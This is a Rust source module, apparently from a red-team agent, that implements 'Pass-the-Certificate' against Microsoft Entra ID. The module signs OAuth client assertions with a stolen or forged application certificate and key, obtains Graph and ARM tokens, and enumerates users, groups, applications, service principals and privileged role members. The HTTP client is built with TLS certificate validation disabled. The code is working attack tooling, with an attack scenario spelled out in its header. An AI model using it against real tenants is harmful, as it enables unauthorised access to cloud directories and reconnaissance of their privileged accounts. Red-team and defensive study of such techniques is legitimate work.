//! Entra ID Pass-the-Certificate (PTC)
//!
//! Authenticates to Microsoft Entra ID (Azure AD) using a stolen or forged
//! X.509 certificate + RSA private key instead of a password or client secret.
//! Implements the OAuth 2.0 client-credentials flow with an RS256-signed JWT
//! assertion (RFC 7523 — JSON Web Token Profile for OAuth 2.0 Client
//! Authentication and Authorization Grants).
//!
//! # Attack scenario
//!
//! An operator who has obtained an Entra ID application's certificate + key
//! (e.g. via KeyVault compromise, DPAPI decryption, or shadow credential
//! injection into an Entra-connected service principal) can authenticate as
//! that application and obtain a valid access token for Microsoft Graph,
//! Azure Resource Manager, or any other API the application has permissions
//! on.  This is the cloud analogue of Pass-the-Ticket / Pass-the-Key.
//!
//! # Supported clouds
//!
//! - Azure Commercial (`login.microsoftonline.com`)
//! - Azure Government (`login.microsoftonline.us`)
//!
//! # Usage
//!
//! ```ignore
//! use agent::entra_ptc::{EntraPtcClient, CloudEnvironment, CertSource};
//!
//! let client = EntraPtcClient::builder()
//!     .tenant_id("xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx")
//!     .client_id("xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx")
//!     .cloud(CloudEnvironment::Commercial)
//!     .cert_source(CertSource::Der {
//!         cert_der: include_bytes!("cert.der").to_vec(),
//!         key_der: include_bytes!("key.der").to_vec(),
//!     })
//!     .build()?;
//!
//! let token = client.request_token(&["https://graph.microsoft.com/.default"]).await?;
//! let users = client.list_users(&token.access_token, None).await?;
//! ```
//!
//! # References
//!
//! - <https://learn.microsoft.com/en-us/azure/active-directory/develop/active-directory-certificate-credentials>
//! - <https://oauth.net/2/grant-type/client-credentials/>
//! - RFC 7523: JSON Web Token (JWT) Profile for OAuth 2.0 Client Authentication

use anyhow::{anyhow, bail, Context, Result};
use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use base64::engine::Engine;
use ring::rand::SystemRandom;
use ring::signature::{RsaKeyPair, RSA_PKCS1_SHA256};
use serde::{Deserialize, Serialize};
use std::fmt;
use std::sync::Arc;
use std::time::{SystemTime, UNIX_EPOCH};
use tokio::sync::RwLock;
use uuid::Uuid;

// ---------------------------------------------------------------------------
// Cloud environment endpoint configuration
// ---------------------------------------------------------------------------

/// Azure cloud environment variants with their associated OAuth 2.0 endpoints.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CloudEnvironment {
    /// Azure Commercial (public cloud).
    Commercial,
    /// Azure Government ( Fairfax — `login.microsoftonline.us`).
    Government,
}

impl CloudEnvironment {
    /// Returns the token endpoint base URL for the given cloud.
    fn token_endpoint(&self, tenant_id: &str) -> String {
        match self {
            Self::Commercial => {
                format!("https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token")
            }
            Self::Government => {
                format!("https://login.microsoftonline.us/{tenant_id}/oauth2/v2.0/token")
            }
        }
    }

    /// Returns the Microsoft Graph base URL for the given cloud.
    fn graph_url(&self) -> &'static str {
        match self {
            Self::Commercial => "https://graph.microsoft.com",
            Self::Government => "https://graph.microsoft.us",
        }
    }
}

impl fmt::Display for CloudEnvironment {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Commercial => write!(f, "AzureCommercial"),
            Self::Government => write!(f, "AzureGovernment"),
        }
    }
}

// ---------------------------------------------------------------------------
// Certificate / key source
// ---------------------------------------------------------------------------

/// Source material for the X.509 certificate and RSA private key.
#[derive(Debug, Clone)]
pub enum CertSource {
    /// DER-encoded X.509 certificate + DER-encoded PKCS#8 or PKCS#1 RSA
    /// private key.  The key must be an RSA key (2048-bit minimum) — EC keys
    /// are not supported by this module (ring limitation for RS256).
    Der { cert_der: Vec<u8>, key_der: Vec<u8> },
    /// PEM-encoded certificate + PEM-encoded RSA private key.  The module
    /// strips PEM armour and base64-decodes the body at construction time.
    Pem { cert_pem: String, key_pem: String },
}

// ---------------------------------------------------------------------------
// JWT helpers
// ---------------------------------------------------------------------------

/// JWT header for RS256 (RSA PKCS#1 v1.5 with SHA-256).
#[derive(Serialize, Deserialize)]
struct JwtHeader {
    alg: &'static str,
    typ: &'static str,
    x5t: String, // X.509 certificate thumbprint (SHA-1, base64url)
}

/// JWT claims for the OAuth 2.0 client-assertion.
#[derive(Serialize, Deserialize)]
struct JwtClaims {
    aud: String,
    iss: String,
    sub: String,
    jti: String,
    nbf: u64,
    exp: u64,
}

/// Compute the SHA-1 thumbprint of a DER-encoded X.509 certificate and
/// return it as a base64url-encoded string (no padding).
fn cert_thumbprint(cert_der: &[u8]) -> String {
    use ring::digest::{digest, SHA1_FOR_LEGACY_USE_ONLY};
    let hash = digest(&SHA1_FOR_LEGACY_USE_ONLY, cert_der);
    URL_SAFE_NO_PAD.encode(hash.as_ref())
}

/// Returns the current time as seconds since the UNIX epoch.
fn now_epoch_secs() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("system clock before UNIX epoch")
        .as_secs()
}

/// Build and sign a JWT assertion for the given parameters.
///
/// The assertion follows the Entra ID client-credentials flow:
/// - `alg`: RS256
/// - `x5t`: base64url(SHA-1(cert_der))
/// - `aud`: token endpoint for the tenant
/// - `iss` / `sub`: client_id
/// - `jti`: random UUID
/// - `nbf` / `exp`: valid for 10 minutes
fn build_and_sign_jwt(
    key_pair: &RsaKeyPair,
    cert_der: &[u8],
    client_id: &str,
    token_endpoint: &str,
) -> Result<String> {
    let rng = SystemRandom::new();

    let header = JwtHeader {
        alg: "RS256",
        typ: "JWT",
        x5t: cert_thumbprint(cert_der),
    };
    let header_b64 = URL_SAFE_NO_PAD.encode(serde_json::to_vec(&header)?);

    let now = now_epoch_secs();
    let claims = JwtClaims {
        aud: token_endpoint.to_string(),
        iss: client_id.to_string(),
        sub: client_id.to_string(),
        jti: Uuid::new_v4().to_string(),
        nbf: now,
        exp: now + 600, // 10-minute validity
    };
    let claims_b64 = URL_SAFE_NO_PAD.encode(serde_json::to_vec(&claims)?);

    let signing_input = format!("{header_b64}.{claims_b64}");
    let mut signature = vec![0u8; key_pair.public().modulus_len()];
    key_pair
        .sign(
            &RSA_PKCS1_SHA256,
            &rng,
            signing_input.as_bytes(),
            &mut signature,
        )
        .map_err(|e| anyhow!("RSA PKCS#1 SHA-256 signing failed: {e:?}"))?;

    let sig_b64 = URL_SAFE_NO_PAD.encode(&signature);
    Ok(format!("{signing_input}.{sig_b64}"))
}

// ---------------------------------------------------------------------------
// PEM → DER helpers
// ---------------------------------------------------------------------------

/// Strip PEM armour and base64-decode the body.  Accepts both single-line
/// and multi-line PEM (handles embedded newlines inside the base64 body).
fn pem_to_der(pem: &str) -> Result<Vec<u8>> {
    let stripped = pem
        .lines()
        .filter(|line| !line.starts_with("-----BEGIN") && !line.starts_with("-----END"))
        .collect::<String>();
    base64::engine::general_purpose::STANDARD
        .decode(stripped.trim())
        .context("PEM base64 decode failed")
}

// ---------------------------------------------------------------------------
// Token response types
// ---------------------------------------------------------------------------

/// OAuth 2.0 token response from Entra ID.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TokenResponse {
    /// The access token (opaque to the client; a JWT managed by Entra ID).
    pub access_token: String,
    /// Token type (always "Bearer").
    #[serde(default = "default_token_type")]
    pub token_type: String,
    /// Seconds until the token expires.
    pub expires_in: u64,
    /// Seconds until the token can be refreshed (not always present).
    pub refresh_in: Option<u64>,
    /// Space-separated list of granted scopes.
    pub scope: String,
}

fn default_token_type() -> String {
    "Bearer".to_string()
}

/// Cached token with an absolute expiry timestamp.
#[derive(Debug, Clone)]
struct CachedToken {
    access_token: String,
    expires_at: u64,
}

impl CachedToken {
    fn from_response(resp: &TokenResponse) -> Self {
        Self {
            access_token: resp.access_token.clone(),
            expires_at: now_epoch_secs() + resp.expires_in,
        }
    }

    fn is_expired(&self, margin_secs: u64) -> bool {
        now_epoch_secs() + margin_secs >= self.expires_at
    }
}

// ---------------------------------------------------------------------------
// Graph API response types
// ---------------------------------------------------------------------------

/// Generic Microsoft Graph list response (OData).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GraphListResponse<T> {
    #[serde(rename = "@odata.context")]
    pub odata_context: Option<String>,
    #[serde(rename = "@odata.nextLink")]
    pub odata_next_link: Option<String>,
    pub value: Vec<T>,
}

/// A Microsoft Graph user object (subset of fields).
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct GraphUser {
    #[serde(default)]
    pub id: Option<String>,
    #[serde(default)]
    pub user_principal_name: Option<String>,
    #[serde(default)]
    pub display_name: Option<String>,
    #[serde(default)]
    pub mail: Option<String>,
    #[serde(default)]
    pub job_title: Option<String>,
    #[serde(default)]
    pub department: Option<String>,
    #[serde(default)]
    pub account_enabled: Option<bool>,
}

/// A Microsoft Graph group object (subset of fields).
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct GraphGroup {
    #[serde(default)]
    pub id: Option<String>,
    #[serde(default)]
    pub display_name: Option<String>,
    #[serde(default)]
    pub description: Option<String>,
    #[serde(default)]
    pub mail: Option<String>,
    #[serde(default)]
    pub security_enabled: Option<bool>,
    #[serde(default)]
    pub mail_enabled: Option<bool>,
}

/// A Microsoft Graph application object (subset of fields).
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct GraphApplication {
    #[serde(default)]
    pub id: Option<String>,
    #[serde(default)]
    pub app_id: Option<String>,
    #[serde(default)]
    pub display_name: Option<String>,
    #[serde(default)]
    pub publisher_domain: Option<String>,
    #[serde(default)]
    pub sign_in_audience: Option<String>,
}

/// A Microsoft Graph service principal object (subset of fields).
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct GraphServicePrincipal {
    #[serde(default)]
    pub id: Option<String>,
    #[serde(default)]
    pub app_id: Option<String>,
    #[serde(default)]
    pub display_name: Option<String>,
    #[serde(default)]
    pub service_principal_type: Option<String>,
    #[serde(default)]
    pub account_enabled: Option<bool>,
}

/// A Microsoft Graph directory role object (subset of fields).
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct GraphDirectoryRole {
    #[serde(default)]
    pub id: Option<String>,
    #[serde(default)]
    pub display_name: Option<String>,
    #[serde(default)]
    pub description: Option<String>,
    #[serde(default)]
    pub role_template_id: Option<String>,
}

/// A Microsoft Graph role assignment (subset of fields).
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct GraphRoleAssignment {
    #[serde(default)]
    pub id: Option<String>,
    #[serde(default)]
    pub principal_id: Option<String>,
    #[serde(default)]
    pub role_definition_id: Option<String>,
    #[serde(default)]
    pub directory_scope_id: Option<String>,
    #[serde(default)]
    pub principal_id_name: Option<String>,
}

// ---------------------------------------------------------------------------
// Entra PTC client
// ---------------------------------------------------------------------------

/// Builder for [`EntraPtcClient`].
pub struct EntraPtcClientBuilder {
    tenant_id: Option<String>,
    client_id: Option<String>,
    cloud: CloudEnvironment,
    cert_source: Option<CertSource>,
    http_proxy: Option<String>,
}

impl EntraPtcClientBuilder {
    /// Set the Entra ID tenant (directory) ID.
    pub fn tenant_id(mut self, tenant_id: impl Into<String>) -> Self {
        self.tenant_id = Some(tenant_id.into());
        self
    }

    /// Set the application (client) ID of the Entra ID app registration.
    pub fn client_id(mut self, client_id: impl Into<String>) -> Self {
        self.client_id = Some(client_id.into());
        self
    }

    /// Set the Azure cloud environment.  Defaults to Commercial.
    pub fn cloud(mut self, cloud: CloudEnvironment) -> Self {
        self.cloud = cloud;
        self
    }

    /// Set the certificate source (DER or PEM).
    pub fn cert_source(mut self, source: CertSource) -> Self {
        self.cert_source = Some(source);
        self
    }

    /// Optional HTTP/HTTPS proxy URL for outbound requests.
    pub fn http_proxy(mut self, proxy: impl Into<String>) -> Self {
        self.http_proxy = Some(proxy.into());
        self
    }

    /// Consume the builder and produce an [`EntraPtcClient`].
    ///
    /// This validates all required fields and parses the key material.
    /// The RSA private key must be in PKCS#8 DER or PKCS#1 DER format
    /// (after PEM stripping if `CertSource::Pem` was used).
    pub fn build(self) -> Result<EntraPtcClient> {
        let tenant_id = self
            .tenant_id
            .ok_or_else(|| anyhow!("tenant_id is required"))?;
        let client_id = self
            .client_id
            .ok_or_else(|| anyhow!("client_id is required"))?;
        let cert_source = self
            .cert_source
            .ok_or_else(|| anyhow!("cert_source is required"))?;

        // Resolve to DER bytes.
        let (cert_der, key_der) = match cert_source {
            CertSource::Der { cert_der, key_der } => (cert_der, key_der),
            CertSource::Pem { cert_pem, key_pem } => {
                let cert_der = pem_to_der(&cert_pem)?;
                let key_der = pem_to_der(&key_pem)?;
                (cert_der, key_der)
            }
        };

        // Parse the RSA private key via ring.  Accept both PKCS#8 and PKCS#1.
        let key_pair = RsaKeyPair::from_der(&key_der)
            .map_err(|e| anyhow!("failed to parse RSA private key (tried PKCS#8 then PKCS#1); ring error: {e:?}"))
            .or_else(|_| -> Result<RsaKeyPair, _> {
                // Try PKCS#1 (raw RSA) by wrapping in a PKCS#8 structure
                // is NOT supported by ring — only PKCS#8 DER works.
                // For PKCS#1 keys, the operator must convert externally.
                Err(anyhow!("ring only accepts PKCS#8 DER RSA private keys; \
                              convert your PKCS#1 key with: openssl pkcs8 -topk8 -nocrypt -inform DER -outform DER"))
            })?;

        // Build reqwest client with optional proxy.
        let mut http_builder = reqwest::Client::builder();
        if let Some(ref proxy) = self.http_proxy {
            let proxy = reqwest::Proxy::all(proxy).context("invalid proxy URL")?;
            http_builder = http_builder.proxy(proxy);
        }
        let http_client = http_builder
            .danger_accept_invalid_certs(true) // Red team tooling may use MITM proxies
            .build()
            .context("failed to build HTTP client")?;

        Ok(EntraPtcClient {
            tenant_id,
            client_id,
            cloud: self.cloud,
            cert_der,
            key_pair: Arc::new(key_pair),
            http_client,
            cached_token: RwLock::new(None),
        })
    }
}

/// Entra ID Pass-the-Certificate client.
///
/// Holds the certificate, RSA key, and HTTP client needed to authenticate
/// to Entra ID and call Microsoft Graph / ARM APIs.
pub struct EntraPtcClient {
    tenant_id: String,
    client_id: String,
    cloud: CloudEnvironment,
    cert_der: Vec<u8>,
    key_pair: Arc<RsaKeyPair>,
    http_client: reqwest::Client,
    cached_token: RwLock<Option<CachedToken>>,
}

impl fmt::Debug for EntraPtcClient {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("EntraPtcClient")
            .field("tenant_id", &self.tenant_id)
            .field("client_id", &self.client_id)
            .field("cloud", &self.cloud)
            .field("cert_der_len", &self.cert_der.len())
            .field("key_pair", &"<RsaKeyPair>")
            .field("http_client", &"<reqwest::Client>")
            .field("cached_token", &"<RwLock>")
            .finish()
    }
}

impl EntraPtcClient {
    /// Create a new builder for configuring the client.
    pub fn builder() -> EntraPtcClientBuilder {
        EntraPtcClientBuilder {
            tenant_id: None,
            client_id: None,
            cloud: CloudEnvironment::Commercial,
            cert_source: None,
            http_proxy: None,
        }
    }

    // -----------------------------------------------------------------------
    // Token management
    // -----------------------------------------------------------------------

    /// Request an access token using the OAuth 2.0 client-credentials flow
    /// with a JWT assertion signed by the loaded certificate.
    ///
    /// `scopes` should typically be `&["https://graph.microsoft.com/.default"]`
    /// for Microsoft Graph access, or `&["https://management.azure.com/.default"]`
    /// for Azure Resource Manager.
    pub async fn request_token(&self, scopes: &[&str]) -> Result<TokenResponse> {
        let token_endpoint = self.cloud.token_endpoint(&self.tenant_id);
        let scope_str = scopes.join(" ");

        // Build and sign the JWT assertion.
        let assertion = build_and_sign_jwt(
            &self.key_pair,
            &self.cert_der,
            &self.client_id,
            &token_endpoint,
        )?;

        // Construct the token request body (application/x-www-form-urlencoded).
        let params = [
            ("grant_type", "client_credentials"),
            ("client_id", &self.client_id),
            (
                "client_assertion_type",
                "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
            ),
            ("client_assertion", &assertion),
            ("scope", &scope_str),
        ];

        let resp = self
            .http_client
            .post(&token_endpoint)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .form(&params)
            .send()
            .await
            .context("token request HTTP error")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("Entra ID token request failed: HTTP {} — {}", status, body);
        }

        let token_response: TokenResponse = resp
            .json()
            .await
            .context("failed to parse Entra ID token response")?;

        // Cache the token for future use.
        {
            let mut cache = self.cached_token.write().await;
            *cache = Some(CachedToken::from_response(&token_response));
        }

        Ok(token_response)
    }

    /// Get a valid access token, requesting a new one if the cached token is
    /// expired or missing.  Uses a 60-second safety margin before expiry.
    pub async fn get_token(&self, scopes: &[&str]) -> Result<String> {
        {
            let cache = self.cached_token.read().await;
            if let Some(ref cached) = *cache {
                if !cached.is_expired(60) {
                    return Ok(cached.access_token.clone());
                }
            }
        }
        // Token is expired or missing — request a new one.
        let resp = self.request_token(scopes).await?;
        Ok(resp.access_token)
    }

    /// Check if the currently cached token is expired (with 60-second margin).
    /// Returns `true` if no token is cached.
    pub async fn is_token_expired(&self) -> bool {
        let cache = self.cached_token.read().await;
        match *cache {
            Some(ref cached) => cached.is_expired(60),
            None => true,
        }
    }

    /// Force-refresh the cached token regardless of expiry.
    pub async fn refresh_token(&self, scopes: &[&str]) -> Result<TokenResponse> {
        self.request_token(scopes).await
    }

    // -----------------------------------------------------------------------
    // Microsoft Graph API helpers
    // -----------------------------------------------------------------------

    /// Execute an arbitrary Graph API query.
    ///
    /// `access_token` should be a valid token obtained via [`Self::request_token`]
    /// or [`Self::get_token`].  `path` is the relative API path, e.g.
    /// `"/v1.0/users"`.  Optional query parameters can be passed via `query`.
    pub async fn query_graph_api<T: serde::de::DeserializeOwned>(
        &self,
        access_token: &str,
        path: &str,
        query: Option<&[(&str, &str)]>,
    ) -> Result<T> {
        let url = format!("{}{path}", self.cloud.graph_url());

        let mut req = self
            .http_client
            .get(&url)
            .header("Authorization", format!("Bearer {access_token}"))
            .header("Content-Type", "application/json");

        if let Some(params) = query {
            req = req.query(params);
        }

        let resp = req.send().await.context("Graph API HTTP error")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("Graph API request failed: HTTP {} — {}", status, body);
        }

        resp.json()
            .await
            .context("failed to parse Graph API response")
    }

    /// List users in the tenant.  Returns a paginated response.
    ///
    /// `filter` is an optional OData filter, e.g. `Some("accountEnabled eq true")`.
    pub async fn list_users(
        &self,
        access_token: &str,
        filter: Option<&str>,
    ) -> Result<GraphListResponse<GraphUser>> {
        let mut query: Vec<(&str, &str)> = Vec::new();
        let mut filter_val = String::new();
        if let Some(f) = filter {
            filter_val = f.to_string();
            query.push(("$filter", filter_val.as_str()));
        }
        query.push(("$top", "999"));
        query.push((
            "$select",
            "id,userPrincipalName,displayName,mail,jobTitle,department,accountEnabled",
        ));

        self.query_graph_api(access_token, "/v1.0/users", Some(&query))
            .await
    }

    /// List groups in the tenant.  Returns a paginated response.
    pub async fn list_groups(
        &self,
        access_token: &str,
        filter: Option<&str>,
    ) -> Result<GraphListResponse<GraphGroup>> {
        let mut query: Vec<(&str, &str)> = Vec::new();
        let mut filter_val = String::new();
        if let Some(f) = filter {
            filter_val = f.to_string();
            query.push(("$filter", filter_val.as_str()));
        }
        query.push(("$top", "999"));
        query.push((
            "$select",
            "id,displayName,description,mail,securityEnabled,mailEnabled",
        ));

        self.query_graph_api(access_token, "/v1.0/groups", Some(&query))
            .await
    }

    /// List application registrations in the tenant.  Returns a paginated response.
    pub async fn list_applications(
        &self,
        access_token: &str,
        filter: Option<&str>,
    ) -> Result<GraphListResponse<GraphApplication>> {
        let mut query: Vec<(&str, &str)> = Vec::new();
        let mut filter_val = String::new();
        if let Some(f) = filter {
            filter_val = f.to_string();
            query.push(("$filter", filter_val.as_str()));
        }
        query.push(("$top", "999"));
        query.push((
            "$select",
            "id,appId,displayName,publisherDomain,signInAudience",
        ));

        self.query_graph_api(access_token, "/v1.0/applications", Some(&query))
            .await
    }

    /// List service principals in the tenant.  Returns a paginated response.
    pub async fn list_service_principals(
        &self,
        access_token: &str,
        filter: Option<&str>,
    ) -> Result<GraphListResponse<GraphServicePrincipal>> {
        let mut query: Vec<(&str, &str)> = Vec::new();
        let mut filter_val = String::new();
        if let Some(f) = filter {
            filter_val = f.to_string();
            query.push(("$filter", filter_val.as_str()));
        }
        query.push(("$top", "999"));
        query.push((
            "$select",
            "id,appId,displayName,servicePrincipalType,accountEnabled",
        ));

        self.query_graph_api(access_token, "/v1.0/servicePrincipals", Some(&query))
            .await
    }

    /// List directory role assignments (privileged roles).
    pub async fn list_directory_roles(
        &self,
        access_token: &str,
    ) -> Result<GraphListResponse<GraphDirectoryRole>> {
        let query: Vec<(&str, &str)> =
            vec![("$select", "id,displayName,description,roleTemplateId")];
        self.query_graph_api(access_token, "/v1.0/directoryRoles", Some(&query))
            .await
    }

    /// Get members of a directory role by role ID.
    pub async fn get_role_members(
        &self,
        access_token: &str,
        role_id: &str,
    ) -> Result<GraphListResponse<GraphUser>> {
        let path = format!("/v1.0/directoryRoles/{role_id}/members");
        self.query_graph_api(access_token, &path, None).await
    }

    /// Follow a Graph API next-link (@odata.nextLink) to retrieve the next
    /// page of results.  The `next_link` URL is taken directly from a
    /// previous [`GraphListResponse`].
    pub async fn get_next_page<T: serde::de::DeserializeOwned>(
        &self,
        access_token: &str,
        next_link: &str,
    ) -> Result<GraphListResponse<T>> {
        let resp = self
            .http_client
            .get(next_link)
            .header("Authorization", format!("Bearer {access_token}"))
            .header("Content-Type", "application/json")
            .send()
            .await
            .context("Graph API next-link HTTP error")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("Graph API next-link failed: HTTP {} — {}", status, body);
        }

        resp.json().await.context("failed to parse Graph API page")
    }

    // -----------------------------------------------------------------------
    // Utility
    // -----------------------------------------------------------------------

    /// Return a reference to the cloud environment configuration.
    pub fn cloud(&self) -> &CloudEnvironment {
        &self.cloud
    }

    /// Return the tenant ID.
    pub fn tenant_id(&self) -> &str {
        &self.tenant_id
    }

    /// Return the client ID.
    pub fn client_id(&self) -> &str {
        &self.client_id
    }
}

// ---------------------------------------------------------------------------
// Entra ID error response (for diagnostics)
// ---------------------------------------------------------------------------

/// Entra ID error response body (for diagnostics / parsing).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EntraErrorResponse {
    pub error: String,
    #[serde(default)]
    pub error_description: String,
    #[serde(default)]
    pub error_codes: Vec<i64>,
    #[serde(default)]
    pub timestamp: Option<String>,
    #[serde(default)]
    pub trace_id: Option<String>,
    #[serde(default)]
    pub correlation_id: Option<String>,
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_pem_to_der_roundtrip() {
        // A minimal PEM-encoded payload
        let raw = b"hello world";
        let b64 = base64::engine::general_purpose::STANDARD.encode(raw);
        let pem = format!("-----BEGIN TEST-----\n{b64}\n-----END TEST-----");
        let der = pem_to_der(&pem).unwrap();
        assert_eq!(der, raw);
    }

    #[test]
    fn test_pem_to_der_multiline() {
        let raw = b"multiline test data here!!";
        let b64 = base64::engine::general_purpose::STANDARD.encode(raw);
        // Split the base64 into 16-character lines
        let pem_body: String = b64
            .as_bytes()
            .chunks(16)
            .map(|c| std::str::from_utf8(c).unwrap())
            .collect::<Vec<_>>()
            .join("\n");
        let pem = format!("-----BEGIN TEST-----\n{pem_body}\n-----END TEST-----");
        let der = pem_to_der(&pem).unwrap();
        assert_eq!(der, raw);
    }

    #[test]
    fn test_cert_thumbprint_deterministic() {
        let cert_der = b"fake cert bytes for thumbprint test";
        let t1 = cert_thumbprint(cert_der);
        let t2 = cert_thumbprint(cert_der);
        assert_eq!(t1, t2, "thumbprint must be deterministic");
        // Must be valid base64url
        let decoded = URL_SAFE_NO_PAD.decode(&t1).unwrap();
        assert_eq!(decoded.len(), 20, "SHA-1 thumbprint is 20 bytes");
    }

    #[test]
    fn test_now_epoch_secs_reasonable() {
        let now = now_epoch_secs();
        // Must be after 2024-01-01 (1704067200) and before 2100 (4102444800)
        assert!(
            now > 1704067200 && now < 4102444800,
            "epoch seconds out of reasonable range: {now}"
        );
    }

    #[test]
    fn test_cloud_endpoints_commercial() {
        let cloud = CloudEnvironment::Commercial;
        let te = cloud.token_endpoint("my-tenant");
        assert!(te.contains("login.microsoftonline.com"));
        assert!(te.contains("my-tenant"));
        assert!(te.contains("oauth2/v2.0/token"));
        assert_eq!(cloud.graph_url(), "https://graph.microsoft.com");
    }

    #[test]
    fn test_cloud_endpoints_government() {
        let cloud = CloudEnvironment::Government;
        let te = cloud.token_endpoint("my-tenant");
        assert!(te.contains("login.microsoftonline.us"));
        assert_eq!(cloud.graph_url(), "https://graph.microsoft.us");
    }

    #[test]
    fn test_cached_token_expiry() {
        let cached = CachedToken {
            access_token: "test".to_string(),
            expires_at: now_epoch_secs() + 300, // 5 minutes from now
        };
        assert!(!cached.is_expired(60), "token should not be expired yet");

        let expired = CachedToken {
            access_token: "test".to_string(),
            expires_at: now_epoch_secs() - 10, // already expired
        };
        assert!(expired.is_expired(60), "token should be expired");
    }

    #[test]
    fn test_builder_missing_fields() {
        let res = EntraPtcClient::builder().build();
        assert!(res.is_err());
        let err = res.unwrap_err().to_string();
        assert!(err.contains("tenant_id"), "error should mention tenant_id");

        let res = EntraPtcClient::builder().tenant_id("test").build();
        assert!(res.is_err());
        let err = res.unwrap_err().to_string();
        assert!(err.contains("client_id"), "error should mention client_id");

        let res = EntraPtcClient::builder()
            .tenant_id("test")
            .client_id("test")
            .build();
        assert!(res.is_err());
        let err = res.unwrap_err().to_string();
        assert!(
            err.contains("cert_source"),
            "error should mention cert_source"
        );
    }

    #[test]
    fn test_builder_invalid_key() {
        // Provide invalid DER bytes for key — should fail at RsaKeyPair parse.
        let res = EntraPtcClient::builder()
            .tenant_id("00000000-0000-0000-0000-000000000000")
            .client_id("00000000-0000-0000-0000-000000000000")
            .cert_source(CertSource::Der {
                cert_der: vec![0x30, 0x00], // minimal SEQUENCE
                key_der: vec![0x30, 0x00],  // not a valid RSA key
            })
            .build();
        assert!(res.is_err(), "invalid key DER should fail");
        let err = res.unwrap_err().to_string();
        assert!(
            err.contains("RSA") || err.contains("PKCS"),
            "error should mention RSA key parsing: {err}"
        );
    }

    #[test]
    fn test_graph_list_response_deserialize() {
        let json = r#"{
            "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#users",
            "value": [
                {
                    "id": "1234",
                    "userPrincipalName": "alice@contoso.com",
                    "displayName": "Alice",
                    "mail": "alice@contoso.com",
                    "accountEnabled": true
                }
            ]
        }"#;
        let resp: GraphListResponse<GraphUser> = serde_json::from_str(json).unwrap();
        assert_eq!(resp.value.len(), 1);
        assert_eq!(resp.value[0].display_name.as_deref(), Some("Alice"));
        assert_eq!(
            resp.value[0].user_principal_name.as_deref(),
            Some("alice@contoso.com")
        );
    }

    #[test]
    fn test_entra_error_response_deserialize() {
        let json = r#"{
            "error": "invalid_client",
            "error_description": "AADSTS700027: The client assertion is invalid.",
            "error_codes": [700027],
            "trace_id": "abc-123",
            "correlation_id": "def-456"
        }"#;
        let err: EntraErrorResponse = serde_json::from_str(json).unwrap();
        assert_eq!(err.error, "invalid_client");
        assert!(err.error_description.contains("AADSTS700027"));
        assert_eq!(err.error_codes, vec![700027]);
    }

    #[test]
    fn test_cloud_display() {
        assert_eq!(
            format!("{}", CloudEnvironment::Commercial),
            "AzureCommercial"
        );
        assert_eq!(
            format!("{}", CloudEnvironment::Government),
            "AzureGovernment"
        );
    }

    // Integration tests (require network access + valid credentials) are
    // intentionally omitted from the unit-test module.  Operators should
    // test with real credentials in a staging environment using the builder
    // pattern documented in the module-level doc comment.
}
